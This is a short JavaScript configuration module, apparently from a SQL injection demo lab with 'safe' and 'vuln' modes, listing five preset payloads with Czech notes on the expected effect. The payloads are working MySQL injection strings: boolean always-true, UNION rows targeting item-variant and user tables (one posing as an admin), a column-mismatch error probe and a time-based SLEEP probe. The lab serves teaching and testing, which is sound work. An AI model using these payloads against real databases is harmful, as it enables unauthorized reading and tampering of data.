export const MODE_OPTIONS = ["safe", "vuln"];
export const PATTERN_OPTIONS = ["boolean", "union", "error", "time"];
export const TARGET_OPTIONS = ["items", "variants", "users"];

export const SQLI_PRESETS = [
  {
    id: "boolean-true",
    label: "Boolean: always true",
    mode: "vuln",
    pattern: "boolean",
    target: "variants",
    payload: "%' OR 1=1 -- ",
    note: "Očekávej změnu rowCount / dataPreview.",
  },
  {
    id: "union-basic",
    label: "UNION: variants row",
    mode: "vuln",
    pattern: "union",
    target: "variants",
    payload: "%' UNION SELECT 999002,'UNION-SKU','Union Variant',1,1,'Union Item' -- ",
    note: "Očekávej syntetický řádek ve variants dataPreview.",
  },
  {
    id: "union-users-row",
    label: "UNION: users row",
    mode: "vuln",
    pattern: "union",
    target: "users",
    payload: "%' UNION SELECT 999003,'union-user@example.com','Union User','admin',NOW() -- ",
    note: "Očekávej syntetický users řádek bez standardního výpisu password_hash.",
  },
  {
    id: "error-union-mismatch",
    label: "Error: UNION column mismatch",
    mode: "vuln",
    pattern: "error",
    target: "variants",
    payload: "%' UNION SELECT 1,2,3,4,5 -- ",
    note: "Očekávej SQL error (jiný počet sloupců než SELECT).",
  },
  {
    id: "time-sleep-2",
    label: "Time: SLEEP(2)",
    mode: "vuln",
    pattern: "time",
    target: "variants",
    payload: "ZZZ%' OR IF(1=1,SLEEP(2),0)=0 -- ",
    note: "Očekávej server duration okolo 2 sekund.",
  },
];
